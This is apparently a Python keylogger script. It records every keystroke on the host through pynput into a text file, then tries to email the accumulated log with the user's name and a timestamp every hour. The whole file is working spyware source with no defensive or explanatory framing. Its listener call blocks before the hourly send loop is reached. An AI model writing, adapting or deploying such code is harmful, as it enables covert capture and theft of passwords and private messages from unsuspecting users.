from pynput.keyboard import Listener
import constant
import utilities
import emailSender
import time
from datetime import datetime

def send_logs():
    _message = utilities.read_key_log_file()
    _subject = f'kelogger logs from {constant.user_name} of date {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
    emailSender.send_email(_subject, _message)

def save_keyboard_clicks_in_file(key):
    ch = str(key)
    ch = ch.replace("'", "")
    if ch == 'Key.space':
        ch = ' '
    if ch == "Key.shift":
        ch = ""
    if ch == 'Key.shift_l':
        ch = ''
    if ch == "Key.ctrl_l":
        ch = ""
    if ch == "Key.alt_l":
        ch = ""
    if ch == "Key.enter":
        ch = "\n"
    with open(constant.txt_file_path, 'a') as f:
        f.write(ch)

def save_keyboard_clicks():
    with Listener(on_press=save_keyboard_clicks_in_file) as ch:
        ch.join()


save_keyboard_clicks()

while True:
    send_logs()
    with open(constant.txt_file_path, 'a') as f:
        f.write(f'\n [ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} ] \n')
    time.sleep(60 * 60)  # 60 minutes
